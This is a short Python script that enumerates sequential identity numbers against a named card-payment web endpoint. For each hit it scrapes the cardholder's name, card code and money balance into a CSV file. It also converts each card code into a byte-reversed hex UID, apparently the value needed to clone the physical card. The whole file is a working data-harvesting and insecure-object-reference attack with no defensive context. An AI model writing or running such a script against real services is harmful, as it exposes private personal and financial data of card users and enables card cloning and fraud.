import urllib.parse
import urllib.request
import json
import csv
import os
import time
import requests
import socket 

import urllib.request

csvFile3 = open('csvFile3.csv','w', newline='') 
writer2 = csv.writer(csvFile3)
writer2.writerow(['ID','UID','Name',"Money","rightuid"])

def getdata(no):
    url = 'http://www.baihecard.com:8870/wxPay/reqCardNo'
    postData = {
    "IdentityID":no
    }

    response = requests.post(url,data=postData)

    result = json.loads(response.text)
    if result['ret'] != [] :
        print ("ID:",result['ret'][0]["ID"]," | UID: ",result['ret'][0]["CardCode"]," | Name:",result['ret'][0]["Name"]," |  Money:",result['ret'][0]["Money0"])
        xxUID = hex(int(result['ret'][0]["CardCode"])).split()
        a = str(xxUID[0])
        rightuid = str(a[8]+a[9] + a[6]+a[7] + a[4]+a[5] + a[2]+a[3])

        print(rightuid)
	
        writer2.writerow([result['ret'][0]["ID"],result['ret'][0]["CardCode"],result['ret'][0]["Name"],result['ret'][0]["Money0"],"'"+rightuid])
        

for i in range(2016081800,2016081899):
    getdata(i)
    print (i)
for i in range(2016081700,2016081799):
    getdata(i)
    print (i)
for i in range(2016081900,2016081999):
    getdata(i)
    print (i)
for i in range(2016071800,2016071899):
    getdata(i)
    print (i)
for i in range(2016081600,2016081699):
    getdata(i)
    print (i)
csvFile3.close()
